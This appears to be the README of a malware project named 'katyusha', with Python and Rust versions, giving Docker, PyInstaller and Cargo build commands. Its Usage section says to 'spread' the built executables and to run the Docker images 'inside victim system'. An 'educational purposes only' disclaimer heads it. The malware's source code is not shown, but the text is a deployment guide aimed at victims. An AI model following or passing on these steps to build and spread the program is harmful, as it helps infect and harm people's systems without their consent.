# :information_source: EDUCATIONAL PURPOSES ONLY

### Docker Setup

```cd katpy && docker build -t katpy . && docker run -d katpy```

```cd katrust && docker build -t katrust . && docker run -d katrust```

#### saving the docker images: ```docker save $(docker images -q) | gzip > katyusha.tar.gz```

#### loading saved docker images: ```docker load -i katyusha.tar.gz```

### Build on Python

```pyinstaller --onefile --windowed --icon=katyusha.ico katpy/katyusha.py```

### Build on Rust
```cd katrust && cargo build --bin katyusha --release```

### Usage

> **First Method**

Spread ```katyusha.exe``` inside `katpy/dist` or ```katrust.exe``` inside `katrust/target/release` folder.

> **Second Method**

Run docker images inside victim system either by running the container or by loading the saved image.
